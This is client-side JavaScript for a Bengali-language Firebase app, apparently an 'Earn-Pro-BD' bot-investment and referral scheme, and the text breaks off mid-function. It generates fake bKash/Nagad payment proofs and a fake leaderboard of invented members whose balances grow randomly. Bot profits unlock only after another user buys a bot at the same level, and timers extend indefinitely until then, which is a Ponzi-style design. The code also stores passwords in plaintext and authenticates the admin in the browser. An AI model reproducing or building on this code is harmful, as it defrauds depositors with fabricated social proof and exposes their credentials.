// ==========================================
// FIREBASE REALTIME DATABASE CONFIGURATION
// ==========================================
const firebaseConfig = {
    apiKey: "AIzaSyDqG0TFBK-0ZM5IjTwU4VC39esnCDsShI0",
    authDomain: "trounament-d8110.firebaseapp.com",
    databaseURL: "https://trounament-d8110-default-rtdb.firebaseio.com",
    projectId: "trounament-d8110",
    storageBucket: "trounament-d8110.firebasestorage.app",
    messagingSenderId: "882962094817",
    appId: "1:882962094817:web:111ac2630cc2a4199db5a0",
    measurementId: "G-FB2ZY0MLFG"
};

// Initialize Firebase App
firebase.initializeApp(firebaseConfig);
const db = firebase.database();

// App Global States
let currentAuthMode = 'login';
let currentUser = null;
let liveInterval = null;
let fakeTxInterval = null;
let leaderboardInterval = null;

const LIVE_WEBSITE_URL = "https://badhanytt.github.io/Earn-Pro-BD/";

// DOM Content Loaded
document.addEventListener("DOMContentLoaded", () => {
    try { loadLeaderboard(); } catch(e) { console.log("Leaderboard bypass"); }
    checkAutoLoginSession(); 
    checkReferralLink(); 
});

// রেফারেল লিংক রিড করা
function checkReferralLink() {
    const urlParams = new URLSearchParams(window.location.search);
    let refCodeFromUrl = urlParams.get('ref'); 
    if (!refCodeFromUrl && window.location.href.includes('ref=')) {
        const splitUrl = window.location.href.split('ref=');
        if(splitUrl[1]) refCodeFromUrl = splitUrl[1].split('&')[0];
    }
    if (refCodeFromUrl) {
        setTimeout(() => {
            switchAuth('register');
            const refInput = document.getElementById('ref-code-input');
            if (refInput) {
                refInput.value = refCodeFromUrl.toUpperCase().trim();
                refInput.readOnly = true; 
                refInput.style.borderColor = "#2dd4bf";
                refInput.style.backgroundColor = "#1e293b"; 
            }
        }, 800); 
    }
}

// অটো লগইন সেশন চেক
function checkAutoLoginSession() {
    let savedUser = localStorage.getItem("quantum_user");
    let savedPass = localStorage.getItem("quantum_pass");
    if (savedUser && savedPass) {
        if (savedUser === "admin") {
            db.ref('adminConfig/Pass').once('value', snap => {
                if(snap.val() === savedPass) {
                    currentUser = { username: 'admin', role: 'admin' };
                    document.getElementById('auth-page').classList.add('hidden');
                    document.getElementById('admin-panel').classList.remove('hidden');
                    switchAdminTab('dash');
                } else { localStorage.clear(); }
            });
            return;
        }
        db.ref('users/' + savedUser).once('value', snapshot => {
            let user = snapshot.val();
            if (user && user.password === savedPass) {
                currentUser = user;
                document.getElementById('auth-page').classList.add('hidden');
                document.getElementById('main-app').classList.remove('hidden');
                switchTab('home', document.querySelector('.bottom-nav .nav-item'));
                syncUserData(); startLiveTimerLoop(); triggerNoticeModal(); startFakeTransactions();
            } else { localStorage.clear(); }
        });
    }
}

// অথেনটিকেশন ট্যাব চেঞ্জার
function switchAuth(mode) {
    currentAuthMode = mode;
    document.getElementById('auth-btn-text').innerText = mode === 'login' ? 'Login' : 'Register';
    document.getElementById('tab-login-btn').className = mode === 'login' ? 'active-tab-btn' : '';
    document.getElementById('tab-reg-btn').className = mode === 'register' ? 'active-tab-btn' : '';
    if(mode === 'register') {
        document.getElementById('ref-field-container').classList.remove('hidden');
    } else {
        document.getElementById('ref-field-container').classList.add('hidden');
    }
}

// লগইন ও রেজিস্ট্রেশন সাবমিশন
function handleAuth() {
    let u = document.getElementById('username').value.trim();
    let p = document.getElementById('password').value.trim();
    let enteredRefCode = document.getElementById('ref-code-input').value.trim().toUpperCase();

    if(!u || !p) return alert("Please enter all credentials");
    document.getElementById('auth-spinner').classList.remove('hidden');
    document.getElementById('auth-btn').disabled = true;

    if (u === "admin") {
        db.ref('adminConfig/Pass').once('value', snap => {
            document.getElementById('auth-spinner').classList.add('hidden');
            document.getElementById('auth-btn').disabled = false;
            if(snap.exists() && p === snap.val()) {
                localStorage.setItem("quantum_user", "admin");
                localStorage.setItem("quantum_pass", p);
                currentUser = { username: 'admin', role: 'admin' };
                document.getElementById('auth-page').classList.add('hidden');
                document.getElementById('admin-panel').classList.remove('hidden');
                switchAdminTab('dash'); 
            } else { alert("ভুল অ্যাডমিন পাসওয়ার্ড!"); }
        });
        return;
    }

    if (currentAuthMode === 'register') {
        if(localStorage.getItem('device_locked_account')) {
            document.getElementById('auth-spinner').classList.add('hidden');
            document.getElementById('auth-btn').disabled = false;
            return alert("❌ সিকিউরিটি এরর: এক ডিভাইসে একাধিক অ্যাকাউন্ট নিষিদ্ধ!");
        }
        db.ref('users/' + u).once('value', async snapshot => {
            if (snapshot.exists()) {
                document.getElementById('auth-spinner').classList.add('hidden');
                document.getElementById('auth-btn').disabled = false;
                return alert("User already exists!");
            }
            let finalReferrerUsername = "none";
            if(enteredRefCode !== "") {
                let foundReferrer = await findUserByReferCode(enteredRefCode);
                if(!foundReferrer) {
                    document.getElementById('auth-spinner').classList.add('hidden');
                    document.getElementById('auth-btn').disabled = false;
                    return alert("❌ ভুল রেফার কোড!");
                }
                finalReferrerUsername = foundReferrer;
            }
            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
            let randomString = '';
            for (let i = 0; i < 7; i++) randomString += chars.charAt(Math.floor(Math.random() * chars.length));
            
            let newUserObject = { 
                username: u, password: p, balance: 0,
                myOwnRefCode: randomString, referredBy: finalReferrerUsername,   
                refWalletPending: 0, refWalletSuccess: 0, hasBoughtBot: false 
            };
            db.ref('users/' + u).set(newUserObject).then(() => {
                localStorage.setItem('device_locked_account', u);
                if(finalReferrerUsername !== "none") { processReferralSetup(finalReferrerUsername, u); } 
                else { completeRegistrationFlow(); }
            });
        });
    } else {
        db.ref('users/' + u).once('value', snapshot => {
            let user = snapshot.val();
            document.getElementById('auth-spinner').classList.add('hidden');
            document.getElementById('auth-btn').disabled = false;
            if (!user || user.password !== p) return alert("Wrong credentials");
            localStorage.setItem("quantum_user", u);
            localStorage.setItem("quantum_pass", p);
            currentUser = user;
            document.getElementById('auth-page').classList.add('hidden');
            document.getElementById('main-app').classList.remove('hidden');
            switchTab('home', document.querySelector('.bottom-nav .nav-item'));
            syncUserData(); startLiveTimerLoop(); triggerNoticeModal(); startFakeTransactions();
        });
    }
}

function findUserByReferCode(code) {
    return new Promise((resolve) => {
        db.ref('users').once('value', snapshot => {
            let foundUser = null;
            snapshot.forEach(child => {
                if(child.val().myOwnRefCode === code) foundUser = child.key;
            });
            resolve(foundUser);
        });
    });
}

function completeRegistrationFlow() {
    document.getElementById('auth-spinner').classList.add('hidden');
    document.getElementById('auth-btn').disabled = false;
    if (document.getElementById('ref-code-input')) document.getElementById('ref-code-input').value = '';
    alert("Registration Successful!");
    switchAuth('login');
    window.history.replaceState({}, document.title, window.location.pathname);
}

function processReferralSetup(referrerUsername, newUserName) {
    db.ref('sysSettings/referralBonus').once('value', snapshot => {
        let bonusAmount = parseFloat(snapshot.val()) || 0;
        if(bonusAmount > 0) {
            db.ref('users/' + referrerUsername).once('value', refSnap => {
                if(refSnap.exists()){
                    let currentPending = parseFloat(refSnap.val().refWalletPending || 0);
                    db.ref('users/' + referrerUsername + '/refWalletPending').set(parseFloat((currentPending + bonusAmount).toFixed(2))).then(() => {
                        completeRegistrationFlow();
                    });
                } else { completeRegistrationFlow(); }
            });
        } else { completeRegistrationFlow(); }
    });
}

// রিয়েল-টাইম ডাটা সিঙ্কিং
function syncUserData() {
    if(!currentUser || currentUser.username === 'admin') return;
    db.ref('users/' + currentUser.username).on('value', snapshot => {
        let updatedUser = snapshot.val();
        if(updatedUser) {
            currentUser = updatedUser; 
            if(document.getElementById('user-balance')) document.getElementById('user-balance').innerText = currentUser.balance;
            if(document.getElementById('user-display-name')) document.getElementById('user-display-name').innerText = currentUser.username;
            if(document.getElementById('user-ref-pending')) document.getElementById('user-ref-pending').innerText = currentUser.refWalletPending || 0;
            if(document.getElementById('user-ref-success')) document.getElementById('user-ref-success').innerText = currentUser.refWalletSuccess || 0;
            let permanentRefInput = document.getElementById('permanent-ref-code');
            if(permanentRefInput) permanentRefInput.value = currentUser.myOwnRefCode ? `${LIVE_WEBSITE_URL}?ref=${currentUser.myOwnRefCode}` : "N/A";
            renderMarketBots();
        }
    });
}

function copyRefCode() {
    let codeInput = document.getElementById("permanent-ref-code");
    if(!codeInput || codeInput.value === "N/A" || codeInput.value === "") return alert("কোড লোড হয়নি!");
    navigator.clipboard.writeText(codeInput.value).then(() => {
        alert("🎉 রেফার লিংক কপি হয়েছে!");
    }).catch(() => {
        codeInput.select(); document.execCommand('copy'); alert("লিংক কপি হয়েছে!");
    });
}

// ইউজার ট্যাব সুইচ
function switchTab(tabName, element) {
    document.querySelectorAll('.tab-content').forEach(tab => tab.classList.add('hidden'));
    document.querySelectorAll('.nav-item').forEach(item => item.classList.remove('active'));
    document.getElementById(`tab-${tabName}`).classList.remove('hidden');
    if(element) element.classList.add('active');
    if(tabName === 'profile') loadProfileData();
    if(tabName === 'leaderboard') loadLeaderboard();
    if(tabName === 'home' && currentUser) syncUserData();
}

// অ্যাডমিন ট্যাব সুইচ ও ডেটা ফেচ
function switchAdminTab(adminTabName) {
    document.querySelectorAll('.admin-tab-content').forEach(content => content.classList.add('hidden'));
    document.querySelectorAll('.admin-nav-btn').forEach(btn => btn.classList.remove('active-admin-btn'));
    document.getElementById(`admin-tab-${adminTabName}`).classList.remove('hidden');
    document.getElementById(`admin-btn-${adminTabName}`).classList.add('active-admin-btn');
    loadAdminData();
}

function toggleWalletView(viewType) {
    let depSec = document.getElementById('section-deposit');
    let witSec = document.getElementById('section-withdraw');
    if(viewType === 'deposit') { depSec.classList.remove('hidden'); witSec.classList.add('hidden'); } 
    else { witSec.classList.remove('hidden'); depSec.classList.add('hidden'); }
}

function logout() {
    if(currentUser && currentUser.username !== 'admin') db.ref('users/' + currentUser.username).off();
    clearInterval(liveInterval); clearInterval(fakeTxInterval); clearInterval(leaderboardInterval);
    currentUser = null; localStorage.removeItem("quantum_user"); localStorage.removeItem("quantum_pass");
    document.getElementById('main-app').classList.add('hidden');
    document.getElementById('admin-panel').classList.add('hidden');
    document.getElementById('auth-page').classList.remove('hidden');
}

// নোটিশ সিস্টেমস
function triggerNoticeModal() {
    db.ref('sysNotice').on('value', snapshot => {
        if(snapshot.val()) {
            document.getElementById('notice-text-content').innerText = snapshot.val();
            document.getElementById('notice-modal').classList.remove('hidden');
        }
    });
}
function closeNotice() { document.getElementById('notice-modal').classList.add('hidden'); }

function pushNotice() {
    let text = document.getElementById('admin-notice-input').value.trim();
    if(!text) return alert("Notice empty");
    db.ref('sysNotice').set(text).then(() => { alert("Notice updated Successfully!"); });
}

// ভুয়া ট্রানজেকশন পেমেন্ট প্রুফ মেকার লুপ
function startFakeTransactions() {
    const container = document.getElementById('fake-transaction-list');
    if(!container) return;
    const methods = ['bKash', 'Nagad'], prefixes = ['017', '019', '018', '016'], amounts = [550, 750, 1200, 2500, 5000];
    function createSingleFakeTx() {
        let m = methods[Math.floor(Math.random() * methods.length)], p = prefixes[Math.floor(Math.random() * prefixes.length)];
        let num = p + '******' + Math.floor(10 + Math.random() * 90), amt = amounts[Math.floor(Math.random() * amounts.length)];
        let txCardHtml = `<div class="fake-proof-card animate__animated animate__fadeInDown"><div class="left"><span class="method ${m === 'bKash'?'bkash-bg':'nagad-bg'}">${m}</span><span class="num">নম্বর: ${num}</span></div><div class="right"><span class="amt">+ ৳ ${amt}</span><span class="status" style="color:#10b981;">Success</span></div></div>`;
        container.insertAdjacentHTML('afterbegin', txCardHtml);
        if (container.children.length > 3) container.removeChild(container.lastChild);
    }
    clearInterval(fakeTxInterval); fakeTxInterval = setInterval(createSingleFakeTx, 4000);
}

// ডিপোজিট প্রসেসিং
function depositRequest() {
    let amountInput = document.getElementById('deposit-amount'), txidInput = document.getElementById('deposit-txid');
    let amount = parseFloat(amountInput.value) || 0, trx = txidInput.value.trim();
    if(amount < 100 || trx === "") return alert("সঠিক তথ্য দিন।");

    db.ref('deposits').once('value', snapshot => {
        let hasPending = false;
        snapshot.forEach(c => { if(c.val().username === currentUser.username && c.val().status === "pending") hasPending = true; });
        if (hasPending) return alert("আপনার একটি রিকোয়েস্ট অলরেডি পেন্ডিং আছে।");

        let dId = Date.now();
        db.ref('deposits/' + dId).set({ id: dId, username: currentUser.username, method: 'bKash', amount: amount, trxId: trx, status: "pending" })
        .then(() => { alert("ডিপোজিট সাবমিট হয়েছে!"); amountInput.value = ""; txidInput.value = ""; });
    });
}

// উইথড্র প্রসেসিং
function withdrawRequest() {
    let amtInput = document.getElementById('withdraw-amount'), phoneInput = document.getElementById('withdraw-phone');
    let amt = parseFloat(amtInput.value) || 0, phone = phoneInput.value.trim();
    if (amt < 500 || !phone) return alert("সঠিক অ্যামাউন্ট বা নাম্বার দিন।");

    db.ref('users/' + currentUser.username).once('value', userSnap => {
        let userDb = userSnap.val();
        if (!userDb || userDb.balance < amt || (userDb.balance - amt) < 50) return alert("পর্যাপ্ত ব্যালেন্স নেই।");

        db.ref('withdraws').once('value', snapshot => {
            let hasPending = false;
            snapshot.forEach(c => { if(c.val().username === currentUser.username && c.val().status === "pending") hasPending = true; });
            if (hasPending) return alert("আগের রিকোয়েস্ট পেন্ডিং আছে।");

            let fee = parseFloat((amt * 0.02).toFixed(2)), net = parseFloat((amt - fee).toFixed(2)), updatedBal = parseFloat((userDb.balance - amt).toFixed(2));
            db.ref('users/' + currentUser.username + '/balance').set(updatedBal).then(() => {
                let wId = Date.now();
                db.ref('withdraws/' + wId).set({ id: wId, username: currentUser.username, reqAmount: amt, netPayable: net, phone: phone, method: 'bKash', status: 'pending' })
                .then(() => { alert("উইথড্র সাবমিট হয়েছে!"); amtInput.value = ''; phoneInput.value = ''; loadProfileData(); });
            });
        });
    });
}

// ইউজার প্রোফাইল ট্রানজেকশন রেন্ডারার
function loadProfileData() {
    if(!currentUser || currentUser.username === 'admin') return;
    document.getElementById('profile-name').innerText = currentUser.username;
    document.getElementById('profile-balance').innerText = currentUser.balance;
    db.ref('deposits').once('value', snap => {
        let body = document.getElementById('user-deposit-history'); if(!body) return; body.innerHTML = '';
        snap.forEach(c => { if(c.val().username === currentUser.username) body.insertAdjacentHTML('afterbegin', `<tr><td>${c.val().amount} TK</td><td>${c.val().trxId||"N/A"}</td><td>${c.val().status.toUpperCase()}</td></tr>`); });
    });
    db.ref('withdraws').once('value', snap => {
        let body = document.getElementById('user-withdraw-history'); if(!body) return; body.innerHTML = '';
        snap.forEach(c => { if(c.val().username === currentUser.username) body.insertAdjacentHTML('afterbegin', `<tr><td>${c.val().reqAmount} TK</td><td>${c.val().netPayable} TK</td><td>${c.val().status.toUpperCase()}</td></tr>`); });
    });
}

// মার্কেট বট রেন্ডারার
function renderMarketBots() {
    db.ref('bots').once('value', snapshot => {
        let market = document.getElementById('bot-market'); if(!market) return; market.innerHTML = '';
        if(!snapshot.exists()) { 
            market.innerHTML = '<p style="color:#64748b; text-align:center; font-size:13px; grid-column: 1/-1;">মার্কেটে কোনো বট উপলব্ধ নেই।</p>'; 
            return; 
        }
        snapshot.forEach(child => {
            let bot = child.val();
            market.innerHTML += `
                <div class="bot-card" style="background:#1e293b; padding:15px; border-radius:8px; border:1px solid #334155;">
                    <h4 style="margin:0 0 8px 0; font-size:16px; color:#fff;">🤖 ${bot.name}</h4>
                    <div style="font-size:13px; color:#94a3b8; margin-bottom:10px; line-height: 1.5;">
                        <p style="margin:2px 0;">⏳ বটের মেয়াদ: <b style="color:#f59e0b;">${bot.days} দিন</b></p>
                        <p style="margin:2px 0;">💰 বটের দাম: <b style="color:#fff;">${bot.price} TK</b></p>
                        <p style="margin:2px 0;">📈 মোট প্রফিট: <b style="color:#10b981;">+${bot.profit} TK</b></p>
                    </div>
                    <button class="btn-glow" style="width:100%; padding:8px; background:#3b82f6; color:#fff; border:none; border-radius:5px; font-weight:bold; cursor:pointer;" 
                            onclick="buyBot('${child.key}')">
                        বট অ্যাক্টিভ করুন
                    </button>
                </div>`;
        });
    });
}

// বট ক্রয় প্রসেসিং এবং রোটেশন ট্রিগার
function buyBot(botKey) {
    db.ref('bots/' + botKey).once('value', snapshot => {
        let bot = snapshot.val();
        db.ref('users/' + currentUser.username).once('value', userSnap => {
            let userDb = userSnap.val();
            if (!userDb || userDb.balance < bot.price) return alert("পর্যাপ্ত ব্যালেন্স নেই।");
            
            let newBal = parseFloat((userDb.balance - bot.price).toFixed(2));
            db.ref('users/' + currentUser.username + '/balance').set(newBal).then(() => {
                let pId = Date.now(), endTime = Date.now() + (bot.days * 24 * 60 * 60 * 1000);
                
                db.ref('globalPurchases/' + pId).set({ 
                    id: pId, username: currentUser.username, botName: bot.name, 
                    price: bot.price, profitAmount: bot.profit, endTime: endTime, status: "running" 
                })
                .then(() => { 
                    db.ref('users/' + currentUser.username + '/hasBoughtBot').set(true);
                    checkAndReleaseReferralBonus(currentUser.username);
                    releaseOlderBotsOfSameLevel(bot.price, pId);
                    alert("বট অ্যাক্টিভ হয়েছে!"); 
                });
            });
        });
    });
}

// একই লেভেলের পুরোনো হোল্ড থাকা বটগুলোকে রিলিজ করা
function releaseOlderBotsOfSameLevel(botPrice, currentPurchaseId) {
    db.ref('globalPurchases').once('value', snapshot => {
        snapshot.forEach(child => {
            let p = child.val();
            if (p.id !== currentPurchaseId && p.price === botPrice && (p.status === 'waiting' || (p.status === 'running' && p.endTime <= Date.now()))) {
                db.ref('globalPurchases/' + child.key + '/status').set('claimable');
            }
        });
    });
}

// রেফারেল ওয়ালেট পেন্ডিং থেকে সাকসেস-এ কনভার্ট লজিক
function checkAndReleaseReferralBonus(buyerUsername) {
    db.ref('users/' + buyerUsername).once('value', snap => {
        let uData = snap.val();
        if(uData && uData.referredBy !== "none") {
            let refBoss = uData.referredBy;
            db.ref('sysSettings/referralBonus').once('value', bonusSnap => {
                let bonus = parseFloat(bonusSnap.val()) || 0;
                if(bonus > 0) {
                    db.ref('users/' + refBoss).once('value', bossSnap => {
                        let bossData = bossSnap.val();
                        if(bossData) {
                            let pnd = parseFloat(bossData.refWalletPending || 0) - bonus; if(pnd < 0) pnd = 0;
                            let suc = parseFloat(bossData.refWalletSuccess || 0) + bonus;
                            let bal = parseFloat(bossData.balance || 0) + bonus;
                            db.ref('users/' + refBoss).update({
                                refWalletPending: parseFloat(pnd.toFixed(2)),
                                refWalletSuccess: parseFloat(suc.toFixed(2)),
                                balance: parseFloat(bal.toFixed(2))
                            });
                        }
                    });
                }
            });
        }
    });
}

function startLiveTimerLoop() { liveInterval = setInterval(() => { if(currentUser && currentUser.username !== 'admin') triggerCloudBotsEvaluation(); }, 1000); }

// সাইকেলিং সিস্টেমের লাইভটাইম মূল্যায়ন ও ২ দিন এক্সটেনশন লুপ
function triggerCloudBotsEvaluation() {
    db.ref('globalPurchases').once('value', snapshot => {
        let container = document.getElementById('my-bots'); if(!container) return; container.innerHTML = '';
        let count = 0;

        snapshot.forEach(child => {
            let p = child.val(); if(p.username !== currentUser.username) return;
            count++;

            let now = Date.now();
            let timeLeft = p.endTime - now;

            if (p.status === "running" && timeLeft <= 0) {
                let extendedTime = now + (2 * 24 * 60 * 60 * 1000); 
                db.ref('globalPurchases/' + child.key).update({ status: "waiting", endTime: extendedTime });
                p.status = "waiting"; p.endTime = extendedTime; timeLeft = extendedTime - now;
            }
            
            if (p.status === "waiting" && timeLeft <= 0) {
                let extendedTime = now + (2 * 24 * 60 * 60 * 1000);
                db.ref('globalPurchases/' + child.key + '/endTime').set(extendedTime);
                p.endTime = extendedTime; timeLeft = extendedTime - now;
            }

            let cardHtml = `<div class="bot-card" style="border-left: 4px solid #3b82f6; margin-bottom: 10px; padding: 12px; background: #1e293b; border-radius: 8px;">
                <h5 style="margin:0; font-size:14px; color:#60a5fa;">🤖 ${p.botName} (লেভেল: ৳ ${p.price})</h5>`;

            if (p.status === "running") {
                let days = Math.floor(timeLeft / (1000 * 60 * 60 * 24)), hours = Math.floor((timeLeft / (1000 * 60 * 60)) % 24);
                let minutes = Math.floor((timeLeft / (1000 * 60)) % 60), seconds = Math.floor((timeLeft / 1000) % 60);
                cardHtml += `
                    <p style="margin:6px 0 4px 0; font-size:12px; color:#f59e0b;">বটের অবস্থা: ⏳ মাইনিং রানিং</p>
                    <p style="margin:0; font-size:13px; color:#fff; font-weight:bold;">বাকি সময়: <span style="color:#2dd4bf;">${days} দিন ${hours} ঘ. ${minutes} মি. ${seconds} সে.</span></p>`;
            } else if (p.status === "waiting") {
                let days = Math.floor(timeLeft / (1000 * 60 * 60 * 24)), hours = Math.floor((timeLeft / (1000 * 60 * 60)) % 24);
                let minutes = Math.floor((timeLeft / (1000 * 60)) % 60), seconds = Math.floor((timeLeft / 1000) % 60);
                cardHtml += `
                    <p style="margin:6px 0 4px 0; font-size:12px; color:#ef4444; font-weight:bold;">⚠️ বটের অবস্থা: হোল্ড / ফান্ডিং কোটা খালি</p>
                    <p style="font-size:11px; color:#94a3b8; margin:2px 0;">অন্য কেউ এই লেভেলের বট একটিভ করলে প্রফিট আনলক হবে।</p>
                    <p style="margin:0; font-size:12px; color:#fff;">মেয়াদ বাড়ানো হয়েছে: <span style="color:#f59e0b;">${days} দিন ${hours} ঘ. ${minutes} মি.</span></p>`;
            } else if (p.status === "claimable") {
                cardHtml += `
                    <p style="margin:6px 0 4px 0; font-size:12px; color:#10b981;">বটের অবস্থা: 🎉 ফান্ড আনলকড (টাকা তুলুন)</p>
                    <button style="padding: 6px 12px; font-size: 12px; background: #10b981; color: #fff; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; width: 100%; margin-top: 5px;" 
                            onclick="claimProfit('${child.key}')">
                        ৳ ${p.profitAmount} ক্লেম করুন
                    </button>`;
            } else {
                cardHtml += `<p style="margin:6px 0 4px 0; font-size:12px; color:#64748b;">বটের অবস্থা: ✅ কমপ্লিট</p><p style="margin:0; font-size:12px; color:#10b981;">লাভ নেওয়া হয়েছে: +৳ ${p.profitAmount}</p>`;
            }
            cardHtml += `</div>`; container.innerHTML += cardHtml;
        });
        if(count === 0) container.innerHTML = '<p style="color:#64748b; font-size:12px; text-align:center; padding:10px;">আপনার কোনো একটিভ বট নেই।</p>';
    });
}

function claimProfit(purchaseKey) {
    db.ref('globalPurchases/' + purchaseKey).once('value', snapshot => {
        let p = snapshot.val();
        if(p && p.status === 'claimable') {
            db.ref('users/' + currentUser.username + '/balance').once('value', balSnap => {
                let currentBal = parseFloat(balSnap.val()) || 0;
                let profit = parseFloat(p.profitAmount) || 0;
                let finalBal = parseFloat((currentBal + profit).toFixed(2));

                db.ref('users/' + currentUser.username + '/balance').set(finalBal).then(() => {
                    db.ref('globalPurchases/' + purchaseKey + '/status').set('completed').then(() => {
                        alert(`🎉 সফলভাবে ৳ ${profit} ব্যালেন্সে যোগ হয়েছে!`);
                    });
                });
            });
        }
    });
}

// ২৫ জনের বিশাল ফেক ডেটা পুল (এখান থেকে প্রতি মিনিটে টপ ১০ জন ফিল্টার হবে)
let fakeLeaderboardData = [
    { name: "Md. Rafiqul Islam", phone: "01734******", balance: 5420, tag: 'কিং মেম্বার' },
    { name: "Al Amin Hossain", phone: "01952******", balance: 4850, tag: 'প্রো Elite' },
    { name: "Sumaiya Akter", phone: "01811******", balance: 4120, tag: 'এলিট মেম্বার' },
    { name: "Tariqul Islam", phone: "01721******", balance: 3950, tag: 'গোল্ড মেম্বার' },
    { name: "Nayeem Ahmed", phone: "01685******", balance: 3820, tag: 'গোল্ড মেম্বার' },
    { name: "Sabbir Rahman", phone: "01515******", balance: 3540, tag: 'সিলভার মেম্বার' },
    { name: "Mst. Rokeya Begum", phone: "01303******", balance: 3120, tag: 'ম্যাট্রিক্স প্রো' },
    { name: "Ariful Islam", phone: "01799******", balance: 2950, tag: 'নিয়মিত মেম্বার' },
    { name: "Fahim Shahriar", phone: "01844******", balance: 2600, tag: 'নতুন মেম্বার' },
    { name: "Anika Tahsin", phone: "01911******", balance: 2450, tag: 'নতুন মেম্বার' },
    { name: "Zayan Ahmed", phone: "01755******", balance: 2310, tag: 'সিলভার মেম্বার' },
    { name: "Taskin Ahmed", phone: "01622******", balance: 2200, tag: 'নিয়মিত মেম্বার' },
    { name: "Nusrat Jahan", phone: "01311******", balance: 2150, tag: 'এলিট মেম্বার' },
    { name: "Hasan Al Banna", phone: "01877******", balance: 2050, tag: 'গোল্ড মেম্বার' },
    { name: "Tanvir Mahtab", phone: "01988******", balance: 1980, tag: 'সিলভার মেম্বার' },
    { name: "Sajid Afridi", phone: "01552******", balance: 1870, tag: 'নতুন মেম্বার' },
    { name: "Mehedi Hasan", phone: "01712******", balance: 1750, tag: 'নিয়মিত মেম্বার' },
    { name: "Riya Khandaker", phone: "01633******", balance: 1690, tag: 'ম্যাট্রিক্স প্রো' },
    { name: "Asif Ent.", phone: "01404******", balance: 1600, tag: 'প্রো Elite' },
    { name: "Imran Khan", phone: "01822******", balance: 1540, tag: 'সিলভার মেম্বার' },
    { name: "Sadia Afrin", phone: "01966******", balance: 1420, tag: 'নতুন মেম্বার' },
    { name: "Rakibul Pro", phone: "01741******", balance: 1350, tag: 'কিং মেম্বার' },
    { name: "Monir Hossain", phone: "01309******", balance: 1200, tag: 'নিয়মিত মেম্বার' },
    { name: "Tamanna Islam", phone: "01511******", balance: 1150, tag: 'নতুন মেম্বার' },
    { name: "Sakib ALL Round", phone: "01671******", balance: 1050, tag: 'গোল্ড মেম্বার' }
];

// লিডারবোর্ড রান ও মিক্সিং ফাংশন
function loadLeaderboard() {
    let listContainer = document.getElementById('leaderboardList'); 
    if (!listContainer) return;

    // ১. প্রতি মিনিটে ২৫ জনের কার ব্যালেন্স কত বাড়বে তা সম্পূর্ণ র্যান্ডম (৳ ১০ থেকে ৳ ৮০)
    fakeLeaderboardData.forEach(user => {
        let randomBonus = Math.floor(Math.random() * 70) + 10; 
        user.balance += randomBonus;
    });

    // ২. ব্যালেন্স অনুযায়ী ২৫ জনকে বড় থেকে ছোট ক্রমানুসারে সাজানো
    fakeLeaderboardData.sort((a, b) => b.balance - a.balance);

    // ৩. সাজানো লিস্ট থেকে শুধুমাত্র প্রথম ১০ জনকে স্ক্রিনে দেখানোর জন্য ফিল্টার করা
    let topTen = fakeLeaderboardData.slice(0, 10);

    listContainer.innerHTML = ''; 
    
    topTen.forEach((u, index) => {
        let rank = index + 1; 
        let rankClass = rank === 1 ? 'rank-1' : (rank === 2 ? 'rank-2' : (rank === 3 ? 'rank-3' : ''));
        let rankIcon = rank === 1 ? '<i class="fas fa-crown" style="color:#f59e0b;"></i>' : rank;

        listContainer.innerHTML += `
            <div class="leaderboard-row ${rankClass} animate__animated animate__fadeInRight" style="padding:10px; background:rgba(255,255,255,0.02); margin-bottom:8px; border-radius:6px; display:flex; justify-content:space-between; align-items:center; border: 1px solid rgba(255,255,255,0.05);">
                <div style="display:flex; align-items:center; gap:10px;">
                    <b style="color:#f59e0b; min-width:20px; text-align:center;">${rankIcon}</b>
                    <div>
                        <div style="font-size:13px; font-weight:bold; color:#fff;">${u.name}</div>
                        <div style="font-size:11px; color:#64748b;">${u.phone} (${u.tag})</div>
                    </div>
                </div>
                <div style="text-align:right;">
                    <span style="color:#10b981; font-weight:bold; font-size:13px;">৳ ${u.balance}</span>
                    <div style="font-size:10px; color:#94a3b8;">রেফার: ${Math.floor(u.balance / 130)} জন</div>
                </div>
            </div>`;
    });
}

// ৪. ৬০,০০০ মিলিসেকেন্ড = ১ মিনিট পর পর অটোমেটিক রিমিক্স লুপ রান হবে
clearInterval(leaderboardInterval);
leaderboardInterval = setInterval(loadLeaderboard, 60000);


// ==========================================
// 👑 COMPLETE ADMIN CONTROL ACTIONS (HTML MATCHED)
// ==========================================

// ১. রেফারেল কমিশন আপডেট ফাংশন
function updateReferralCommission() {
    let amt = parseFloat(document.getElementById('admin-ref-commission-input').value) || 0;
    if(amt < 0) return alert("ভুল অ্যামাউন্ট!");
    db.ref('sysSettings/referralBonus').set(amt).then(() => { alert("রেফার কমিশন আপডেট হয়েছে!"); });
}

// ২. অ্যাডমিন প্যানেল থেকে নতুন বট তৈরি করা
function createBot() {
    let name = document.getElementById('bot-name').value.trim();
    let price = parseFloat(document.getElementById('bot-price').value) || 0;
    let profit = parseFloat(document.getElementById('bot-profit').value) || 0;
    let days = parseInt(document.getElementById('bot-days').value) || 0;

    if(!name || price <= 0 || profit <= 0 || days <= 0) return alert("সবগুলো ঘর সঠিকভাবে পূরণ করুন!");
    
    let bId = Date.now();
    db.ref('bots/' + bId).set({ name: name, price: price, profit: profit, days: days }).then(() => {
        alert("নতুন বট সফলভাবে তৈরি হয়েছে!");
        document.getElementById('bot-name').value = ''; document.getElementById('bot-price').value = '';
        document.getElementById('bot-profit').value = ''; document.getElementById('bot-days').value = '';
        loadAdminData();
    });
}

// ৩. সর্বমোট ড্যাশবোর্ড স্ট্যাটাস গণনা ও টেবিল রেন্ডারিং
function loadAdminData() {
    // ইউজারের মোট ভলিউম গণনা
    db.ref('users').once('value', snap => {
        let body = document.getElementById('user-list-admin'); if(body) body.innerHTML = '';
        let totalVol = 0;
        snap.forEach(c => { 
            let bal = parseFloat(c.val().balance) || 0; totalVol += bal;
            if(body) body.innerHTML += `<tr><td>${c.key}</td><td>${bal} TK</td></tr>`; 
        });
        if(document.getElementById('stat-total-balance')) document.getElementById('stat-total-balance').innerText = totalVol.toFixed(2);
        calculateAdminNetCash();
    });
    
    // পেন্ডিং ডিপোজিট তালিকা রেন্ডার
    db.ref('deposits').once('value', snap => {
        let body = document.getElementById('admin-deposit-list'); if(body) body.innerHTML = '';
        let totalDep = 0;
        snap.forEach(c => {
            let d = c.val();
            if(d.status === 'accepted') totalDep += (parseFloat(d.amount) || 0);
            if(d.status === 'pending' && body) {
